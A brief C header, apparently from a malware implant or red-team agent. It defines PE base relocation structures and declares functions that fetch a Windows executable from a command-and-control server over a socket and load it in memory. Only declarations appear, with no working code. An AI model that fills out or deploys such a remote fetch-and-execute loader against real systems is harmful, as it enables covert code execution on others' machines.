#pragma once

#include "..\helper.h"

typedef struct BASE_RELOCATION_BLOCK {
	DWORD PageAddress;
	DWORD BlockSize;
} BASE_RELOCATION_BLOCK, *PBASE_RELOCATION_BLOCK;

typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;

PBYTE GetPEFromC2(SOCKET* s, PC2_PACKET pFirstPkt);
VOID ExecutePELoader(PBYTE pe_base);